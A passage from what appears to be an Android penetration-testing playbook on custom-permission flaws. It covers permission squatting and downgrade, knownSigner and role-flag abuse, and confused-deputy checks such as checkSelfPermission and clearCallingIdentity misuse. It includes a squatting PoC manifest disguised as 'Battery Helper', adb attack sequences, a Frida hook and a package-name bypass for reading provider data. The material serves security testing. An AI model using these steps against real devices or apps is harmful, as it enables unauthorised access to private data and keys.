| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — "Protection Level Downgrade (Race Condition)"; commonsware.com/blog/2014/02/12/vulnerabilities-custom-permissions.html — *"first one in wins"*, the attacker's `protectionLevel="normal"* "supersedes any `signature` protection level the defender established"* and *"Android never notifies users that the attacker requested this permission"*; AOSP security-model threat class **[T.A2]** "Abusing APIs provided by other apps installed on the device" |

- **Test:** Android resolves a duplicated custom-permission *name* on a first-definer-wins basis. If the target defines `com.target.permission.SYNC` at `signature` but an attacker app defining the same name at `normal` is installed **first**, the attacker's weaker definition is what PackageManager enforces, the attacker is silently granted it, and the target's own signing key is irrelevant. Test both install orders and report the winning one.
- **How:**
  ```xml
  <manifest package="com.poc.squat" xmlns:android="http://schemas.android.com/apk/res/android">
    <permission android:name="com.target.permission.SYNC" android:protectionLevel="normal"/>
    <uses-permission android:name="com.target.permission.SYNC"/>
    <application android:label="Battery Helper"/>
  </manifest>
  ```
  ```bash
  adb uninstall com.target.app            # establish the attacker-first ordering
  adb install squat.apk
  adb install target.apk                  # watch for INSTALL_FAILED_DUPLICATE_PERMISSION
  adb shell pm list permissions -f | grep -A4 com.target.permission.SYNC
  adb shell dumpsys package com.poc.squat | grep -A2 com.target.permission.SYNC
  adb shell am start -n com.target.app/.internal.AdminActivity --es cmd whoami
  # then repeat in the opposite order and record the difference
  ```
  `INSTALL_FAILED_DUPLICATE_PERMISSION` during a test install is itself proof of competing definitions — record it.
- **Proof:** Three observables together: (1) `pm list permissions -f` shows `protectionLevel:normal` and `package:com.poc.squat` as the **definer** even after the target is installed; (2) `dumpsys package com.poc.squat` lists the permission `granted=true`; (3) the supposedly signature-protected component starts and returns data instead of throwing `SecurityException`.
- **Escalation:** Whatever the permission guarded — typically an exported provider (D07) or an AIDL service (D06). A zero-permission app silently obtaining an interface the developer believed was restricted to their own key is a platform-model break, which is the framing that survives triage.
- **Ruled out when:** The install succeeds in *both* orders with `pm list permissions -f` reporting `package:com.target.app` and `protectionLevel:signature` regardless of ordering, **and** the attacker-first install of a same-named `normal` permission causes the target's install to fail with `INSTALL_FAILED_DUPLICATE_PERMISSION` (the platform refusing the collision is the defence working). Demonstrate on the app's `minSdkVersion` lane, not only on your newest device.

### D03-014 · Protection-level downgrade after the defining app is uninstalled

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 (requires the legitimate definer to be absent or removed) |
| **Applies to** | **LEGACY for the CVE-2019-2200 variant: device API < 29.** Live on any device in the app's `minSdkVersion` range below that. Multi-APK products (companion app, plugin, SDK host) are where this is realistic. |
| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — *"if a legitimate app with signature-protected custom permissions is uninstalled, a malicious app can define the same custom permission with weaker protection level and gain access to all components protected by that permission without matching signatures"*; **CVE-2019-2200**, fixed in Android 10, linked from the 2020-02-01 Android Security Bulletin |

- **Test:** Test the full lifecycle, not just a fresh install. If the app that *defined* a custom permission is uninstalled while peers still hold the grant, or is reinstalled after an attacker has claimed the name, the effective protection level can end up lower than declared.
- **How:**
  ```bash
  adb install target.apk && adb install peer.apk     # peer holds the signature permission
  adb uninstall com.target.app                       # the definer goes away
  adb install squat.apk                              # attacker redefines at "normal"
  adb install target.apk                             # the target comes back
  adb shell pm list permissions -f | grep -A4 com.target.permission.SYNC
  adb shell dumpsys package com.poc.squat | grep -A2 com.target.permission.SYNC
  adb shell getprop ro.build.version.sdk             # record; the result is version-dependent
  ```
- **Proof:** After the sequence, `pm list permissions -f` reports a protection level weaker than the target's manifest declares, and/or the attacker package shows the permission granted. The delta between the manifest string and the `pm list permissions -f` string is the evidence; the API level it was produced on is part of the finding.
- **Escalation:** Same chain as D03-013. In a vendor app family, this is cross-app privilege escalation inside the vendor's own product set.
- **Ruled out when:** On every API level within the app's `minSdk`–`targetSdk` range, the uninstall/redefine/reinstall sequence leaves `pm list permissions -f` reporting the target as definer at the declared level. Note: the corpus flags a WebSearch-sourced attribution of a related "grant survives redefinition as dangerous" chain to **CVE-2021-0307** as *unverified at source* — do not cite that number in a report without checking NVD first.

### D03-015 · Ecosystem missing-redeclaration — defined in App A, only *used* by App B

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | vendor app families, OEM preinstall sets, plugin/companion architectures |
| **Maps to** | Google's vulnerability-classes material — *"for sets of apps, check that declared and used permissions match across the whole set of apps"*; `INSTALL_FAILED_DUPLICATE_PERMISSION` as the collision signal |

- **Test:** A `signature` permission defined only in App A but merely *used* by App B is unenforceable when only App B is installed — there is no definition present, so the string is an orphan on that device. This is the realistic, current-Android version of D03-008: the victim installs the companion app and never installs the host.
- **How:** Pull every APK in the vendor's Play developer catalogue and diff per app:
  ```bash
  for apk in family/*.apk; do
    p=$(aapt2 dump badging "$apk" | sed -n "s/^package: name='\([^']*\)'.*/\1/p")
    apktool d -f -s "$apk" -o "out_$p" >/dev/null
    echo "== $p"
    echo "  DEFINES:"; grep -oE '<permission[^>]*android:name="[^"]+"' "out_$p/AndroidManifest.xml" | cut -d'"' -f2 | sed 's/^/    /'
    echo "  USES/ENFORCES:"; grep -oE 'android:(permission|readPermission|writePermission)="[^"]+"' "out_$p/AndroidManifest.xml" | cut -d'"' -f2 | sort -u | grep -v '^android\.permission\.' | sed 's/^/    /'
  done
  ```
  Then install **only** App B on a clean device and run the D03-008 squat.
- **Proof:** On a device with only App B installed, the attacker's `<uses-permission>` for the custom string is granted silently (`dumpsys package com.poc.attacker`) and App B's guarded component is reachable. The same test on a device with both apps installed throws `SecurityException` — that pair of results is the finding.
- **Escalation:** Usually cross-app session sharing: the companion's guarded component is the one that hands the host's token across. -> D06/D07, then D13.
- **Ruled out when:** Every app in the family that *enforces* a custom permission also *defines* it with the same `protectionLevel`, or the install unit makes them inseparable (a single AAB with required feature modules). Verify by install-only-one on a clean device, not by reading the manifests.

### D03-016 · `<permission-tree>` and runtime `PackageManager.addPermission()`

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 / AM-09 (a backend that controls the permission name) |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/manifest/permission-element` — the reverse-domain naming rule, and that multiple packages cannot declare permissions with the same name unless signed with the same certificate |

- **Test:** `<permission-tree>` lets an app add permissions under a namespace at runtime via `PackageManager.addPermission()`. An app that adds permissions from data it does not control — a server response, an intent extra, a config file — is letting an external party choose both the permission *name* and its `protectionLevel`, which defeats every static analysis of the app's access control.
- **How:**
  ```bash
  grep -n '<permission-tree' merged.xml
  grep -rnE 'addPermission\(|addPermissionAsync\(|removePermission\(|new PermissionInfo\(' sources/
  # trace the name/level arguments back to their source
  grep -rn -B10 'addPermission(' sources/ | grep -iE 'getString|optString|getExtra|fromJson|response'
  ```
  After triggering the path, re-read the device:
  ```bash
  adb shell pm list permissions -f | grep '<the tree prefix>'
  ```
- **Proof:** A code path where `addPermission()` receives a name or `protectionLevel` derived from external input, plus `pm list permissions -f` showing the injected permission after you trigger it with a controlled value.
- **Escalation:** Combines with D03-013 — the attacker now picks the name *and* the level. -> D06/D07.
- **Ruled out when:** No `<permission-tree>` element exists and `addPermission` has no call sites; or every call site passes a compile-time constant name with a hard-coded `signature` level.

### D03-017 · Custom permission mapped into a platform `permissionGroup`

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-04 |
| **Applies to** | Android 6.0+ (the runtime permission model) |
| **Maps to** | AOSP security-model paper §4.3.2 — runtime permissions *"are grouped into logical permissions using the `permissionGroup` attribute. When requesting runtime permissions, the group appears as a single permission to avoid over-prompting"*; `developer.android.com/guide/topics/permissions/overview` warns that *"permission group membership can change without notice"*; `source.android.com/docs/core/permissions/runtime_perms` — OEMs *"can add new permissions to a current group, but can't modify the AOSP mapping of dangerous permissions and dangerous permission groups"* |

- **Test:** Runtime prompts are presented per group. A `dangerous` custom permission that names a *platform* `android:permissionGroup` can widen a grant the user believed applied only to the app's own feature, or make the app's own prompt look like a system prompt.
- **How:**
  ```bash
  grep -nE '<permission[^>]*permissionGroup="android\.permission-group\.' merged.xml
  adb shell pm list permissions -d -g          # dangerous perms, grouped — see where the custom one lands
  adb shell dumpsys package $PKG | sed -n '/runtime permissions/,/^$/p'
  ```
- **Proof:** `pm list permissions -d -g` printing the app's custom permission underneath a platform `android.permission-group.*` heading, plus a `dumpsys package` runtime-permission block showing both the platform permission and the custom one flipping to `granted=true` from a single user tap. Record the prompt screen.
- **Escalation:** Silent acquisition of a platform dangerous permission -> location/contacts/SMS access -> D20 privacy, D13 if SMS.
- **Ruled out when:** No custom `<permission>` declares `android:permissionGroup`, or every one that does names a group the app itself declares via `<permission-group>`.

### D03-018 · `knownSigner` / `android:knownCerts` — enumerate the certificate allow-list

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-08 (a partner or rotated-away key holder) |
| **Applies to** | **Android 12+** for the `knownSigner` level. **LEGACY note, and it runs the other way:** on older platforms the same manifest resolves to plain `signature`, which is *stricter* — the newer device is the weaker one. |
| **Maps to** | `developer.android.com/guide/topics/manifest/permission-element` — `"knownSigner"`: *"granted only if requesting app is signed with an allowed certificate (listed as known signer). Automatically granted without user notification"*; `PROTECTION_FLAG_KNOWN_SIGNER` = 0x8000 in `PermissionInfo` |

- **Test:** A `knownSigner` permission is granted to any app whose signing certificate appears in a hard-coded allow-list — not only to apps with the target's current signature. Enumerate the list: any party holding one of those keys, including a now-deprecated partner or a rotated-away old key, can take the permission silently.
- **How:**
  ```bash
  grep -nE 'knownSigner|knownCerts' merged.xml
  grep -rn 'knownCerts' out/res/values/*.xml        # the digest list is usually a string-array resource
  adb shell pm list permissions -f | grep -A3 -i knownSigner
  # manual lineage checks in code, which have the same weakness:
  grep -rnE 'hasSigningCertificate\(|GET_SIGNING_CERTIFICATES|getSigningCertificateHistory\(' sources/
  ```
  Then resolve each SHA-256 digest to an actual signer where you can (compare against the target's own cert and against any partner APK in scope):
  ```bash
  apksigner verify --print-certs base.apk | grep -i 'SHA-256'
  ```
- **Proof:** The `protectionLevel` string containing `knownSigner` plus the resolved `android:knownCerts` array of SHA-256 digests, and — the finding proper — an APK signed with a *historical* or partner key from that array being granted the permission and reaching the guarded component.
- **Escalation:** Whatever the `knownSigner` permission guards, typically an internal provider or an AIDL admin interface -> D06/D07. A digest the target no longer controls is the strongest version of this.
- **Ruled out when:** No `knownSigner` level and no `android:knownCerts` array exists; or the array contains exactly one digest that `apksigner verify --print-certs` confirms is the app's own current signing certificate with no rotation lineage.

### D03-019 · `signatureOrSystem` — deprecated at API 23, and a weaker claim than the developer thinks

| | |
|---|---|
| **Severity ceiling** | Medium — the High belongs to whichever preinstalled holder you then pivot through, and that is filed in D25 |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-08 / OEM scope |
| **Applies to** | all. **LEGACY as a declaration** (deprecated API 23) but still enforced wherever present. |
| **Maps to** | `developer.android.com/guide/topics/manifest/permission-element` — *"`signatureOrSystem`: **Deprecated in API level 23.** Old synonym for `signature|privileged` ... avoid using — `signature` is sufficient"*; `PROTECTION_SIGNATURE_OR_SYSTEM` = 3 in `PermissionInfo`; MASTG-KNOW-0017 |

- **Test:** `signatureOrSystem` grants to apps on the system image **or** same-signature apps. On an OEM image with a permissive system partition, "on the system image" is a far weaker claim than the developer assumes — enumerate who actually holds it.
- **How:**
  ```bash
  grep -n 'signatureOrSystem' merged.xml
  adb shell pm list permissions -f | grep -B4 'signatureOrSystem'
  adb shell pm list packages -s | while read p; do p=${p#package:}; \
    adb shell dumpsys package "$p" | grep -q 'com.target.permission.X' && echo "HOLDER: $p"; done
  ```
- **Proof:** A concrete list of system-image packages holding the permission that the target developer never intended to trust, and at least one of them reachable (an exported component, a debug surface).
- **Escalation:** Pivot through whichever preinstalled package holds it -> D25 OEM surface.
- **Ruled out when:** `grep -n 'signatureOrSystem'` is empty, or the sweep shows the only holders are the target's own packages.

### D03-020 · `PROTECTION_INTERNAL` with no gating flag

| | |
|---|---|
| **Severity ceiling** | **High** (inherited) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 12+ |
| **Maps to** | `PROTECTION_INTERNAL` = 4 in `PermissionInfo`; AOSP `Permissions.md` — *"**internal**: no-op protection, useful with protection flags"* |

- **Test:** `internal` is a no-op *base* protection that exists only to be combined with flags (`role`, `privileged`, `installer`, `verifier`, ...). An `internal`-only permission with no useful flag is not a control at all. Decode any permission whose base level reads `internal` and identify the flag that is supposed to be doing the gating.
- **How:**
  ```bash
  adb shell pm list permissions -f | grep -B4 -A2 'internal'
  grep -nE 'protectionLevel="[^"]*internal' merged.xml
  # decode the accompanying flags per D03-005: 0x10 privileged, 0x100 installer, 0x200 verifier, 0x4000 role
  ```
- **Proof:** A permission whose resolved protection is `internal` with no accompanying flag, used as a component guard, and reached from the zero-permission PoC app.
- **Escalation:** The component becomes an ordinary unprotected exported component -> D04–D07.
- **Ruled out when:** Every `internal` permission carries at least one flag, and you have verified that flag actually excludes an ordinary third-party app (a `role` flag does not — see D03-022).

### D03-021 · `development`-flagged permission grantable straight from the shell

| | |
|---|---|
| **Severity ceiling** | Medium — the adb precondition is a hard cap; if the surface itself yields production secrets, file that as its own finding |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when the surface leaks internal config |
| **Attacker** | AM-11 (physical unlocked / ADB), AM-08 via a compromised MDM or desktop helper |
| **Applies to** | all |
| **Maps to** | `PROTECTION_FLAG_DEVELOPMENT` = 0x20 in `PermissionInfo`; AOSP `Permissions.md` lists `development` among the "optional flags [that] modify protection levels" and documents `adb shell pm grant <package> <permission>` |

- **Test:** A permission carrying the `development` flag can be granted from the shell with `pm grant` even though it is signature-protected. If the target uses one as the access control for a debug or diagnostic surface, anyone with adb takes it.
- **How:**
  ```bash
  adb shell pm list permissions -f | grep -B4 'development'
  adb shell pm grant com.poc.attacker com.target.permission.DEBUG_BRIDGE
  adb shell dumpsys package com.poc.attacker | grep com.target.permission.DEBUG_BRIDGE
  # then exercise the surface from the PoC app
  ```
- **Proof:** `pm grant` succeeds (no `SecurityException`, no "not a changeable permission type") and `dumpsys package` shows `granted=true`, followed by the diagnostic surface returning data.
- **Escalation:** Diagnostic surfaces routinely expose tokens, full request logs, or a "set backend URL" control — the last chains directly into API redirection (D15/D17).
- **Ruled out when:** `pm list permissions -f` shows no `development` flag on any permission the app defines, or `pm grant` fails with `Permission ... is not a changeable permission type` for every candidate.

### D03-022 · Role-protected permission (`PROTECTION_FLAG_ROLE`) — taking the role takes the permission

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-02 (one user tap to change the role holder) |
| **Applies to** | Android 10+ (RoleManager) |
| **Maps to** | `PROTECTION_FLAG_ROLE` = 0x4000 in `PermissionInfo`; AOSP `Permissions.md` on role-protected permissions "tied to system roles for better granularity" and `DefaultPermissionGrantPolicy` pre-grants to "predefined categories (browser, SMS app)" |

- **Test:** A `role`-flagged permission is granted to whichever app currently holds a system Role — default SMS app, default dialer, home/launcher, assistant. If the target's security model assumes only itself can hold the permission, taking the role is the bypass, and role acquisition is a user-visible but very low-friction flow.
- **How:**
  ```bash
  adb shell cmd role get-role-holders android.app.role.SMS
  adb shell cmd role get-role-holders android.app.role.HOME
  adb shell cmd role get-role-holders android.app.role.DIALER
  adb shell dumpsys role | head -60
  adb shell pm list permissions -f | grep -B4 'role'
  ```
- **Proof:** `cmd role get-role-holders` returning the attacker package after the role is taken, plus `dumpsys package com.poc.attacker` showing the role-flagged permission granted, plus the guarded surface responding.
- **Escalation:** SMS role -> OTP interception (D13/D24); HOME role -> private-space visibility when combined with `ACCESS_HIDDEN_PROFILES` (D25).
- **Ruled out when:** No permission the app defines or enforces carries the `role` flag, and the app's own trust decisions do not call `RoleManager.isRoleHeld()` as an authorisation signal.

### D03-023 · A "platform" signature permission whose definer is not `android`

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | AOSP security-model paper §4.3.2 class (5): *"signature permissions ... are only available to components signed with the same key as the component which declares the permission — which is the platform signing key for platform permissions"* |

- **Test:** `signature` on a permission defined by a third-party app means "same key as *that app*", not "same key as the platform". Apps sometimes protect a component with a platform-looking `signature` permission they do not define, assuming it restricts callers to the system. Confirm which package is the definer.
- **How:**
  ```bash
  adb shell pm list permissions -f | grep -A4 'android.permission.SOME_PLATFORM_PERM'
  # 'package:android'  => platform-defined
  # anything else      => the app's own, another app's, or nothing at all
  adb shell dumpsys package android | grep -A2 'SOME_PLATFORM_PERM'
  ```
- **Proof:** `pm list permissions -f` printing a `package:` other than `android` (or no entry at all) for a permission the developer treated as platform-restricted, followed by the interface responding to the zero-permission PoC app.
- **Escalation:** Direct call into the "system-only" interface -> D06/D07.
- **Ruled out when:** Every platform-namespaced permission the app enforces resolves to `package:android` with a `signature`-family protection level.

### D03-024 · `checkSelfPermission()` in an exported entry point — the confused-deputy core

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null) escalating to `broken_authentication_and_session_management.authentication_bypass` (P1) or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `Context.checkSelfPermission` / `checkCallingPermission` / `checkPermission(String,int,int)` — `developer.android.com/reference/android/content/Context`; `developer.android.com/training/permissions/restrict-interactions` — *"check permissions by process ID: `int pid = Binder.getCallingPid(); int uid = Binder.getCallingUid(); context.checkPermission(permission, pid, uid);`"*, with the note that `checkCallingPermission()` *"only works when executing calls from another process"*; AOSP `Permissions.md` — *"on Binder call receiving end, use `Binder.callingPid()` and `Binder.callingUid()` for caller identification"*; AOSP threat class **[T.A2]**; MASWE-0018, CWE-862/863 |

- **Test:** The single highest-value code review in this domain. `checkSelfPermission()` asks *"does **my** app hold this permission"*. For a permission the app declared, it is always `PERMISSION_GRANTED` — so using it inside an exported Activity, Service, Receiver or Provider is not an access control at all. It is a runtime-availability check masquerading as authorisation.
- **How:**
  ```bash
  # the bug pattern
  grep -rnE 'checkSelfPermission\(' sources/
  # correlate each hit with the component it sits in
  grep -rn -B30 'checkSelfPermission(' sources/ | grep -E 'class .*(Activity|Service|Receiver|Provider)'
  # the correct patterns — check whether they are used anywhere at all
  grep -rnE 'checkCallingPermission\(|enforceCallingPermission\(|Binder\.getCallingUid\(\)|Binder\.getCallingPid\(\)|getCallingUidOrThrow\(' sources/
  ```
  Then drive the entry point from the zero-permission PoC of D03-006.
- **Proof:** The PoC app — `dumpsys package com.poc.attacker` showing an empty requested-permission set — successfully invoking the exported component and receiving privileged data or causing a privileged side effect, with **no** `SecurityException` in `adb logcat`. The `checkSelfPermission` call site, decompiled, next to it.
- **Escalation:** Rate on what the deputy does: reading permission-protected data = High; performing a privileged write, starting a non-exported activity, or returning a session artefact = Critical. On a system-UID deputy this is local privilege escalation -> D25.
- **Ruled out when:** Every exported entry point uses `checkCallingPermission()` / `enforceCallingPermission()` / `checkPermission(perm, Binder.getCallingPid(), Binder.getCallingUid())`, and those calls sit **before** any `clearCallingIdentity()` (see D03-027). A `checkSelfPermission()` hit is ruled out only when it is genuinely a feature-availability branch that does not gate a cross-app decision — prove that by showing the deny branch also refuses the caller.

### D03-025 · `checkCallingOrSelfPermission()` / `enforceCallingOrSelfPermission()` — passes because *you* pass

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null) -> P1 as above |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `Context.checkCallingOrSelfPermission` / `enforceCallingOrSelfPermission` — `developer.android.com/reference/android/content/Context`; AOSP threat class [T.A2]; Oversecured's vendor-vulnerability research (a Samsung `semIsBackupEnabled()` that *"returns the value with no checks at all"* beside an AOSP method that does enforce) |

- **Test:** The `...OrSelf` variants return success whenever **either** the caller **or** the callee holds the permission. Since the callee declared it, an unprivileged caller passes. This is the subtler sibling of D03-024 and is easy to read past because the method name contains "Calling".
- **How:**
  ```bash
  grep -rnE 'checkCallingOrSelfPermission\(|enforceCallingOrSelfPermission\(' sources/
  # for each hit, establish (a) is the enclosing component exported, (b) does the app itself hold the permission
  grep -n 'uses-permission' merged.xml | grep -f <(grep -rhoE '"[A-Za-z0-9_.]+\.permission\.[A-Z_]+"' sources/ | tr -d '"' | sort -u)
  ```
  If the app declares the permission in its own manifest, the check is a no-op for every caller.
- **Proof:** The decompiled `enforceCallingOrSelfPermission("android.permission.READ_CONTACTS")` line, the app's own `<uses-permission>` for the same string, and the zero-permission PoC app receiving contact rows.
- **Escalation:** Identical to D03-024; this is also the commonest mechanism behind D03-031 permission re-delegation.
- **Ruled out when:** No `...OrSelf` variant appears on any code path reachable from an exported component, **or** the app does not itself hold the permission being checked (in which case the check does interrogate the caller — but note that it then also fails for legitimate use, which is a functional smell worth reading further).

### D03-026 · `checkCallingPermission()` result discarded — it returns an `int`, it does not throw

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/privacy-and-security/risks/intent-redirection` — documented common mistake: *"assuming `checkCallingPermission()` always throws exceptions (it returns an integer)"*; `risks/access-control-to-exported-components` |

- **Test:** `checkCallingPermission()` returns `PackageManager.PERMISSION_GRANTED` (0) or `PERMISSION_DENIED` (-1). Code that calls it as a bare statement and ignores the return has no check at all. Only `enforceCallingPermission()` / `enforceCallingOrSelfPermission()` throw.
- **How:**
  ```bash
  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' sources/
  # flag any call whose result is not compared
  grep -rnE 'check(Calling|CallingOrSelf|Self)?Permission\([^)]*\)\s*;' sources/
  grep -rnE 'checkPermission\([^)]*\)\s*;' sources/
  ```
- **Proof:** A decompiled `checkCallingPermission("X");` on its own statement line, followed by the privileged action executing unconditionally — then demonstrate the action from the PoC app that does not hold `X`.
- **Escalation:** Same as D03-024.
- **Ruled out when:** Every `check*Permission` call site compares the result to `PackageManager.PERMISSION_GRANTED` (or the negation) and takes a deny branch that returns/throws before the privileged work. Read the deny branch — a deny that logs and falls through is the same bug.

### D03-027 · `Binder.clearCallingIdentity()` launders the caller before the check runs

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; most impactful in system/OEM apps running as UID 1000 |
| **Maps to** | `android.os.Binder` — `clearCallingIdentity()` / `restoreCallingIdentity(long)`; AOSP `Permissions.md` caller-identification guidance; Oversecured vendor-vulnerability research |

- **Test:** `clearCallingIdentity()` swaps the Binder thread's notion of the caller to the **callee's own** identity. Any `getCallingUid()`, `getCallingPid()` or `checkCallingPermission()` executed after it — and before `restoreCallingIdentity()` — evaluates the app itself, not the attacker. Look for a check ordered after the clear, and for a clear with no `finally { restoreCallingIdentity(t); }` on the exception path.
- **How:**
  ```bash
  # extract the windows between clear and restore and see what happens inside
  grep -rn -A25 'clearCallingIdentity()' sources/ \
    | grep -nE 'getCallingUid|getCallingPid|checkCalling|enforceCalling|restoreCallingIdentity'
  # clears with no restore anywhere in the following 40 lines
  grep -rn -A40 'clearCallingIdentity()' sources/ | grep -c restoreCallingIdentity
  ```
  Runtime confirmation:
  ```javascript
  Java.perform(() => {
    const B = Java.use('android.os.Binder');
    B.getCallingUid.implementation = function () {
      const u = this.getCallingUid();
      console.log('[getCallingUid] -> ' + u + '  (myUid=' + Java.use('android.os.Process').myUid() + ')');
      return u;
    };
  });
  ```
- **Proof:** Decompiled code showing the permission/UID check strictly *after* `clearCallingIdentity()`, plus the Frida trace line where `getCallingUid()` returns the target's own UID on a path the developer believed was remote-only, plus the zero-permission PoC reaching the guarded action.
- **Escalation:** Same rating basis as D03-024; this is usually the deeper, harder-to-spot instance of it.
- **Ruled out when:** Every `clearCallingIdentity()` is (a) preceded by the authorisation check and (b) wrapped in `try { ... } finally { Binder.restoreCallingIdentity(token); }`.

### D03-028 · `Binder.getCallingUid()` on a same-process call returns your own UID

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `android.os.Binder` documented caveat — on a local (same-process) invocation `getCallingUid()`/`getCallingPid()` return the caller's *own* UID/PID; `getCallingUidOrThrow()` exists precisely to fail closed when there is no remote caller |

- **Test:** Any authorisation helper written as `if (Binder.getCallingUid() == Process.myUid()) allow;`, or any helper reachable both locally and remotely, is a bypass candidate — the local path satisfies it trivially and the remote path may share the helper.
- **How:**
  ```bash
  grep -rnE 'getCallingUid\(\)\s*==\s*(android\.os\.)?Process\.myUid\(\)' sources/
  grep -rnE 'getCallingUid|getCallingPid|getCallingUidOrThrow' sources/ -A6
  ```
  Then trace which of those helpers are also called from a remote entry point (an exported Service's `onTransact`, a Provider's `call()`), using the hook from D03-027.
- **Proof:** A trace line showing `getCallingUid() -> <the target's own uid>` on a code path the developer believed was remote-only, with the resulting allow branch taken.
- **Escalation:** -> D06 (bound service), D07 (`ContentProvider.call()`), then whatever the method returns.
- **Ruled out when:** Every caller-identity check uses `getCallingUidOrThrow()`, or compares the calling UID against an allow-list resolved through `PackageManager.getPackagesForUid()` **plus** a signature check, and no allow branch is satisfied by `Process.myUid()`.

### D03-029 · `getCallingPackage()` / `getCallingActivity()` null-handling used as authorisation

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/privacy-and-security/risks/intent-redirection` — documented common mistake: treating a non-null `getCallingActivity()` as proof of a trusted caller, *"malicious apps can supply null"*; `risks/access-control-to-exported-components` |

- **Test:** `getCallingPackage()` and `getCallingActivity()` are populated only when the caller used `startActivityForResult()`. A plain `startActivity()` makes them **null**, and the app's check either silently passes or falls into a default-allow branch. Test both invocation styles.
- **How:**
  ```bash
  grep -rnE 'getCallingPackage\(\)|getCallingActivity\(\)|getReferrer\(\)' sources/ -A8
  ```
  From the PoC app, call the activity both ways and log which branch executes:
  ```java
  startActivity(i);                  // getCallingActivity() == null
  startActivityForResult(i, 1);      // getCallingActivity() == your component
  ```
  ```bash
  adb shell am start -n com.target/.SecureActivity --es token AAA    # the null-caller path
  ```
- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted package — typically the activity performing the action when launched with a null caller and refusing when launched with a named, non-allow-listed one. Log the branch taken; that inversion is the finding.
- **Escalation:** -> D04 exported-activity abuse with attacker extras; -> D13/D15 if the branch issues or forwards a session.
- **Ruled out when:** The code treats `null` as deny, and where it does accept a named caller it verifies the caller's **signing certificate** (`PackageManager.getPackageInfo(pkg, GET_SIGNING_CERTIFICATES)` / `hasSigningCertificate`) rather than the name.

### D03-030 · Package-name substring / prefix matching used as a trust boundary

| | |
|---|---|
| **Severity ceiling** | **High** (Low as first disclosed — rate on what the component holds) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | H1 **#331302** (Nextcloud, Low); correct alternative is `PackageManager.getPackageInfo(..., GET_SIGNING_CERTIFICATES)` or a `signature`-level permission |

- **Test:** `contains()`, `startsWith()`, `endsWith()` and `indexOf()` on a caller's package name are trivially satisfiable — the attacker chooses their own `applicationId`.
- **How:**
  ```bash
  grep -rn 'getNameForUid\|getCallingPackage\|getPackagesForUid' sources/ -A6 \
    | grep -nE 'contains|startsWith|endsWith|indexOf|matches'
  ```
  The disclosed Nextcloud shape, verbatim from the report:
  ```java
  private boolean isCallerNotAllowed() {
      String callingPackage = this.mContext.getPackageManager().getNameForUid(Binder.getCallingUid());
      return callingPackage == null || !callingPackage.contains(this.mContext.getPackageName());
  }
  ```
  Build the PoC with an `applicationId` that embeds the victim package name — e.g. `com.attacker.com.nextcloud.client` — install, and read:
  ```bash
  adb shell content query --uri content://org.nextcloud/arbitrary_data
  ```
- **Proof:** The provider/service returning data to a PoC app whose only qualification is a chosen package name. In the disclosed case the returned rows were the app's end-to-end-encryption private keys.
- **Escalation:** -> D07 (provider data), D11 (whatever key material it returns). Frame the finding around what the component holds, not around the string comparison.
- **Ruled out when:** Every caller check resolves the calling UID to its packages and then compares the **signing certificate** against a pinned digest, or the component is guarded by a genuine `signature`-level permission that survives D03-008 through D03-015.

### D03-031 · Permission re-delegation — the app holds the permission, the caller does not, and the app will use it for them

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.privilege_escalation` (null); files to P1 when the delegated read yields another user's data via `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured "Insufficient permission protection" (the canonical example: reading `ContactsContract.CommonDataKinds.Phone` requires `READ_CONTACTS`, but the app's own `content://com.exampleapp.contacts` requires nothing); `developer.android.com/privacy-and-security/security-tips` — *"don't leak permission-protected data ... permission re-delegation"*; MASWE-0018; H1 **#97295** (ok.ru), **#1161401** (Nextcloud, Low 1.3, $250), **#185862** (Twitter location, $560); ATT&CK T1636.001–.005 |

